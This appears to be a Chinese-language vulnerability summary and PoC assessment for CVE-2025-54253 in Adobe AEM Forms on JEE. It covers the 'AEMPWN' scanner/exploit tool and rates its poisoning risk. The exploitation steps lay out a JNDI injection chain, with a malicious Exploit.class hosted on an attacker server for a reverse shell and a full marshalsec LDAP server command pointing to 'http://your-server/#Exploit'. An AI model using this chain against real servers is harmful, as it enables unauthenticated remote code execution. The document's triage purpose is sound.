## CVE-2025-54253 - Adobe Experience Manager (AEM) Forms on Java Enterprise Edition (JEE) 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-54253

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Adobe Experience Manager (AEM) Forms on Java Enterprise Edition (JEE)

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** 未提供具体版本号，但在2025年8月之前发布的版本可能受影响

**利用条件:** 无需认证，远程可利用，低复杂度

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-54253是一个影响Adobe Experience Manager (AEM) Forms on Java Enterprise Edition (JEE) 的关键远程代码执行（RCE）漏洞。该漏洞源于AEM Forms中的配置错误，导致Apache Struts的“devMode”在管理界面中被启用，并且存在认证绕过漏洞。这种结合使得未经身份验证的攻击者能够通过低复杂度的攻击执行Struts框架解析的表达式，进而实现远程代码执行，且无需用户交互。该漏洞的威胁等级被认定为高危，已被CISA列入其已知被利用的漏洞目录，表明其在野利用已得到确认。与此漏洞相关的还有CVE-2025-54254，一个XML外部实体（XXE）注入漏洞，两者经常被联合利用。Adobe已于2025年8月发布补丁修复了这些漏洞。

**POC有效性分析：**
提供的POC名为“AEMPWN”，是一个功能全面、结构良好的扫描器和漏洞利用工具，专门针对Adobe Experience Manager (AEM) Forms中的CVE-2025-54253和CVE-2025-54254漏洞。该工具支持三种操作模式，能够满足不同安全测试阶段的需求：
1.  **安全PoC模式（--poc）**：此模式旨在进行低噪声验证，识别不安全的XML解析行为和可利用的攻击面，而不会触发破坏性操作。它通过验证XML反射、非HTML结构化响应、Canary令牌反射以及不安全XML处理的指标来工作。此模式非常适合初期分类和影响评估。
2.  **OOB XXE模式（--oob）**：此模式通过从AEM服务器发出的出站请求来确认盲XXE。它要求攻击者控制一个HTTP服务器来托管DTD文件并观察入站HTTP请求，从而证明XML解析器会获取外部实体并且可以读取和泄露敏感的本地文件。尽管此模式对于XXE确认有效，但它明确指出，仅凭此模式不足以实现完整的OOB XXE利用，通常需要结合LDAP/JNDI来进一步实现RCE。
3.  **RCE模式（--rce）**：这是完整的漏洞利用模式，用于在AEM服务器上演示实际的代码执行，可造成P1级别的严重影响。它依赖于通过XML解析进行的JNDI注入，这需要额外的基础设施，例如运行的LDAP服务器（例如使用`marshalsec`），该服务器能够提供Java类引用，以及一个托管已编译恶意Java类（例如`Exploit.class`）的HTTP服务器。攻击过程涉及XML解析器解析JNDI引用，导致AEM服务器连接到攻击者的LDAP监听器，LDAP响应随后指向恶意Java类，该类最终由JVM加载并执行。鉴于其模块化设计、清晰的文档和对从安全检测到完整RCE的各种利用阶段的支持，该POC被认为高度有效。其对`marshalsec`用法和简单`Exploit.java`示例的包含进一步证明了其完整性和可用性，同时能兼顾CVE-2025-54253 (RCE) 和 CVE-2025-54254 (XXE) 的风险评估。

**利用步骤：**
1.  **识别目标**：寻找一个暴露在外的Adobe AEM Forms on JEE实例。
2.  **初步扫描（可选但推荐）**：使用AEMPWN的`--poc`模式进行安全扫描，识别不安全的XML处理迹象和潜在的利用点，避免破坏性操作。
3.  **XXE确认（可选，针对CVE-2025-54254）**：如果同时关注CVE-2025-54254，则使用`--oob`模式。需要配置一个攻击者控制的HTTP服务器来托管DTD文件，并观察来自AEM服务器的出站连接，以确认XXE漏洞的存在。
4.  **准备RCE基础设施（针对CVE-2025-54253）**：
    *   编译一个执行恶意操作的Java类（例如`Exploit.java`），如创建文件`/tmp/pwned`或启动反向shell。
    *   将编译好的`Exploit.class`文件托管在攻击者控制的HTTP服务器上（例如`http://your-server/`）。
    *   使用`marshalsec`设置一个LDAP服务器，用于提供一个指向HTTP服务器上恶意Java类的JNDI引用。命令示例如下：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-server/#Exploit" 1389`。
5.  **执行RCE**：使用AEMPWN的`--rce`模式，指定目标AEM Forms实例，并提供JNDI注入所需的参数，指向攻击者的LDAP服务器。
6.  **验证RCE**：检查AEM服务器以验证恶意Java类的执行效果（例如，检查`/tmp/pwned`文件是否存在或是否有反向shell连接）。

**投毒风险分析：**
`AEMPWN`工具被视为一个合法的防御性安全研究工具，其投毒风险评估为**低（10%）**。以下是详细分析：
*   **代码清晰度和意图**：工具的`README.md`文档清晰、结构化，明确声明其用途是“AEM Forms Scanner for CVE-2025-54253 & CVE-2025-54254”，并且“仅供授权安全测试使用”。其操作模式定义明确，区分了安全检测和完整利用。这种透明度是判断其合法性的关键指标。
*   **标准负载**：RCE模式下提供的示例恶意Java类是一个简单的`Runtime.getRuntime().exec()`调用，用于创建文件或反向shell。这些是演示RCE的标准和预期负载。在工具本身中，没有发现任何迹象表明存在高级混淆、意外的网络信标或试图安装持久性恶意软件的行为。
*   **外部依赖**：该工具提及`marshalsec`作为LDAP的最佳工具，`marshalsec`是一个广泛认可且合法的JNDI利用安全研究工具。AEMPWN并未直接捆绑`marshalsec`，而是指导用户如何使用它，这是一种透明且负责任的做法。
*   **无可疑行为**：在提供的`README.md`片段中，没有证据表明该工具试图连接到未知的外部服务器、在未经用户同意的情况下下载额外脚本，或执行超出其声明的漏洞利用功能之外的任何操作。
*   **结论**：尽管任何漏洞利用代码如果被滥用或从不受信任的来源下载都可能带来风险，但`AEMPWN`项目在其`README.md`中所述，符合防御性安全研究工具的最佳实践。基于其操作的透明性以及缺乏任何明显的恶意或欺骗性特征，投毒风险被评估为低。用户始终应验证所下载工具的来源和完整性。

**项目地址:** https://github.com/topics/cve-2025-54253

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54253
